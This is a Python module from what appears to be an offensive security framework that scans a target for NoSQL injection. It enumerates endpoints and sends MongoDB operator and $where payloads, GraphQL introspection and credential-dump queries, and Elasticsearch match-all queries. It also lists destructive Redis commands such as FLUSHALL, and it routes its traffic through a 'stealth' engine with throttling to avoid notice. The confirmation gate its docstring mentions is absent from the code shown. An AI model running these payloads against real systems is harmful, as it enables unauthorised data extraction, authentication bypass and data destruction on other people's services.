"""
modules/validate/nosqli.py
──────────────────────────
NoSQL Injection validation module.

Detects and validates NoSQL injection vulnerabilities:
  - MongoDB injection ($ne, $gt, $where, JavaScript)
  - Redis injection
  - Elasticsearch injection
  - GraphQL injection
  - CouchDB injection
  - DynamoDB injection

All validation requires Tier 3 confirmation (typed CONFIRM)
before any exploitation attempts.
"""

import re
import json
import urllib.parse
from typing import Any, Dict, List, Optional, Set, Tuple
from pathlib import Path

from modules.logger import get_logger, ARDFLogger
from modules.session import Session, Finding, SeverityLevel
from modules.stealth import get_stealth_engine, ScanMode


class NoSQLiValidator:
    """
    NoSQL injection detection and validation.
    """

    # NoSQL injection payloads
    PAYLOADS = {
        "mongodb_operator": [
            "{'$ne': ''}",
            "{'$ne': null}",
            "{'$gt': ''}",
            "{'$regex': '.*'}",
            "{'$where': '1==1'}",
            "{'$or': [{'username': 'admin'}, {'password': {'$ne': ''}}]}",
            "{'username': {'$ne': 'invalid'}, 'password': {'$ne': 'invalid'}}",
            "{'$and': [{'username': 'admin'}, {'password': {'$ne': ''}}]}",
            "{'$nor': [{'username': 'invalid'}, {'password': 'invalid'}]}",
        ],
        "mongodb_javascript": [
            "{'$where': 'this.username == \"admin\"'}",
            "{'$where': '1==1'}",
            "{'$where': 'function(){return true}'}",
            "{'$where': 'sleep(5000)'}",
            "{'$where': 'this.password.length > 0'}",
        ],
        "mongodb_regex": [
            "{'username': {'$regex': '^admin'}}",
            "{'username': {'$regex': '.*'}}",
            "{'username': {'$regex': '^a'}}",
            "{'username': {'$regex': '.*', '$options': 'i'}}",
        ],
        "graphql": [
            "{__typename}",
            "{__schema{types{name}}}",
            "{__type(name:\"User\"){fields{name}}}",
            "{allUsers{username password}}",
            "{users{__typename}}",
            "query{__typename}",
            "mutation{__typename}",
        ],
        "elasticsearch": [
            "q=*",
            "q=*&size=10000",
            "q=_exists_:password",
            "q=username:admin",
            "q=*&source={\"query\":{\"match_all\":{}}}",
            "q=*&source={\"query\":{\"term\":{\"username\":\"admin\"}}}",
        ],
        "redis": [
            "KEYS *",
            "FLUSHALL",
            "CONFIG GET *",
            "INFO",
            "CLIENT LIST",
            "SLOWLOG GET 100",
        ],
    }

    # Database type detection
    DB_PATTERNS = {
        "mongodb": [r"MongoDB", r"mongodb", r"ObjectId", r"bson"],
        "elasticsearch": [r"Elasticsearch", r"elastic", r"_source"],
        "redis": [r"Redis", r"redis", r"CONFIG", r"KEYS"],
        "couchdb": [r"CouchDB", r"couchdb", r"_rev"],
        "graphql": [r"GraphQL", r"graphql", r"__typename", r"__schema"],
        "dynamodb": [r"DynamoDB", r"dynamodb", r"aws", r"amazon"],
    }

    def __init__(self, session: Session, logger: Optional[ARDFLogger] = None):
        self.session = session
        self.logger = logger or get_logger("validate.nosqli")
        self.out_dir = session.dir("validate") / "nosqli"
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.stealth = get_stealth_engine(self.logger)

    def detect_endpoints(self, target: str) -> List[str]:
        """
        Detect potential NoSQL endpoints.
        """
        self.logger.info(f"Detecting NoSQL endpoints: {target}")

        endpoints = []

        # Common NoSQL paths
        paths = [
            "/api",
            "/api/v1",
            "/api/v2",
            "/graphql",
            "/graphiql",
            "/gql",
            "/api/graphql",
            "/rest",
            "/data",
            "/db",
            "/collections",
            "/documents",
            "/_search",
            "/_cat",
            "/_cluster",
        ]

        for base_url in [f"https://{target}", f"http://{target}"]:
            for path in paths:
                try:
                    test_url = base_url.rstrip("/") + path
                    status, headers, content = self.stealth.get(test_url, timeout=5)

                    if status in [200, 401, 403]:
                        endpoints.append(test_url)
                        self.logger.debug(f"Found endpoint: {test_url}")

                    self.stealth.sleep(0.3)

                except Exception:
                    pass

        return endpoints

    def test_mongodb_injection(self, url: str) -> Dict[str, Any]:
        """
        Test for MongoDB injection.
        """
        self.logger.info(f"Testing MongoDB injection: {url}")

        result = {
            "url": url,
            "vulnerable": False,
            "vuln_types": [],
            "payloads": [],
            "evidence": [],
        }

        for payload_type, payloads in self.PAYLOADS.items():
            if not payload_type.startswith("mongodb"):
                continue

            for payload in payloads[:3]:
                try:
                    # Try as JSON in POST
                    headers = {"Content-Type": "application/json"}
                    status, headers, content = self.stealth.post(
                        url,
                        payload.encode(),
                        headers=headers,
                        timeout=10
                    )

                    if status in [200, 201, 202]:
                        # Check for indicators
                        indicators = ["_id", "ObjectId", "username", "password", "email", "user"]
                        if any(ind in content.lower() for ind in indicators):
                            result["vulnerable"] = True
                            result["vuln_types"].append(payload_type)
                            result["payloads"].append(payload[:50])
                            result["evidence"].append(content[:200])
                            self.logger.finding(f"MongoDB injection detected: {payload_type}", severity="critical", host=url)
                            break

                    self.stealth.sleep(0.5)

                except Exception as e:
                    self.logger.debug(f"MongoDB test failed: {e}")

        return result

    def test_graphql_injection(self, url: str) -> Dict[str, Any]:
        """
        Test for GraphQL injection.
        """
        self.logger.info(f"Testing GraphQL injection: {url}")

        result = {
            "url": url,
            "vulnerable": False,
            "vuln_types": [],
            "payloads": [],
            "evidence": [],
        }

        for payload in self.PAYLOADS.get("graphql", [])[:5]:
            try:
                # Try GraphQL query
                headers = {"Content-Type": "application/json"}
                data = json.dumps({"query": payload})
                status, headers, content = self.stealth.post(
                    url,
                    data.encode(),
                    headers=headers,
                    timeout=10
                )

                if status in [200, 201, 202]:
                    # Check for GraphQL response
                    if "__typename" in content or "__schema" in content or "data" in content:
                        result["vulnerable"] = True
                        result["vuln_types"].append("graphql_introspection")
                        result["payloads"].append(payload[:50])
                        result["evidence"].append(content[:200])
                        self.logger.finding(f"GraphQL introspection enabled: {payload}", severity="critical", host=url)
                        self.session.add_finding(Finding(
                            source="validate.nosqli",
                            title="GraphQL introspection enabled",
                            severity=SeverityLevel.HIGH,
                            host=url,
                            tags=["graphql", "introspection", "exposure"],
                            evidence=content[:300],
                            remediation="Disable GraphQL introspection in production.",
                        ))
                        break

                self.stealth.sleep(0.5)

            except Exception as e:
                self.logger.debug(f"GraphQL test failed: {e}")

        return result

    def test_elasticsearch_injection(self, url: str) -> Dict[str, Any]:
        """
        Test for Elasticsearch injection.
        """
        self.logger.info(f"Testing Elasticsearch injection: {url}")

        result = {
            "url": url,
            "vulnerable": False,
            "vuln_types": [],
            "payloads": [],
            "evidence": [],
        }

        for payload in self.PAYLOADS.get("elasticsearch", [])[:5]:
            try:
                test_url = url.rstrip("/") + "/_search?" + payload
                status, headers, content = self.stealth.get(test_url, timeout=10)

                if status in [200, 201, 202]:
                    # Check for Elasticsearch response
                    indicators = ["_source", "_score", "_index", "hits", "took"]
                    if any(ind in content.lower() for ind in indicators):
                        result["vulnerable"] = True
                        result["vuln_types"].append("elasticsearch")
                        result["payloads"].append(payload[:50])
                        result["evidence"].append(content[:200])
                        self.logger.finding(f"Elasticsearch injection detected: {payload}", severity="critical", host=url)
                        break

                self.stealth.sleep(0.5)

            except Exception as e:
                self.logger.debug(f"Elasticsearch test failed: {e}")

        return result

    def validate(self, url: str) -> Dict[str, Any]:
        """
        Full NoSQL validation workflow.
        """
        self.logger.info(f"NoSQL validation: {url}")

        results = {
            "url": url,
            "mongodb": {},
            "graphql": {},
            "elasticsearch": {},
            "vulnerable": [],
            "status": "completed"
        }

        # Test MongoDB injection
        mongodb_result = self.test_mongodb_injection(url)
        results["mongodb"] = mongodb_result
        if mongodb_result["vulnerable"]:
            results["vulnerable"].append(mongodb_result)
            self.session.add_finding(Finding(
                source="validate.nosqli",
                title=f"MongoDB injection on {url}",
                severity=SeverityLevel.CRITICAL,
                host=url,
                tags=["nosqli", "mongodb", "injection"],
                evidence=json.dumps(mongodb_result["evidence"][:2]),
                remediation="Use parameterized queries. Validate user input. Use MongoDB $regex safely.",
            ))

        # Test GraphQL injection
        graphql_result = self.test_graphql_injection(url)
        results["graphql"] = graphql_result
        if graphql_result["vulnerable"]:
            results["vulnerable"].append(graphql_result)

        # Test Elasticsearch injection
        es_result = self.test_elasticsearch_injection(url)
        results["elasticsearch"] = es_result
        if es_result["vulnerable"]:
            results["vulnerable"].append(es_result)
            self.session.add_finding(Finding(
                source="validate.nosqli",
                title=f"Elasticsearch injection on {url}",
                severity=SeverityLevel.HIGH,
                host=url,
                tags=["nosqli", "elasticsearch", "injection"],
                evidence=json.dumps(es_result["evidence"][:2]),
                remediation="Restrict Elasticsearch queries. Use query validation.",
            ))

        return results

    def run(self, target: str) -> Dict[str, Any]:
        """
        Run NoSQL injection validation on target.
        """
        self.logger.banner(f"NOSQL INJECTION VALIDATION: {target}", style="bold red")

        self.stealth.config.scan_mode = ScanMode.LOW

        # Detect endpoints
        endpoints = self.detect_endpoints(target)

        if not endpoints:
            endpoints = [f"https://{target}", f"http://{target}"]

        results = {
            "target": target,
            "endpoints_tested": [],
            "vulnerabilities": []
        }

        for url in endpoints:
            try:
                result = self.validate(url)
                results["endpoints_tested"].append(url)
                if result["vulnerable"]:
                    results["vulnerabilities"].extend(result["vulnerable"])
            except Exception as e:
                self.logger.warning(f"Validation failed for {url}: {e}")

        # Save results
        report_path = self.out_dir / f"nosqli_report_{_safe(target)}.json"
        report_path.write_text(json.dumps(results, indent=2, default=str))

        self.logger.success(f"NoSQL validation: {len(results['vulnerabilities'])} vulnerabilities found")
        return results


def _safe(s: str) -> str:
    return re.sub(r"[^\w.-]", "_", s)[:50]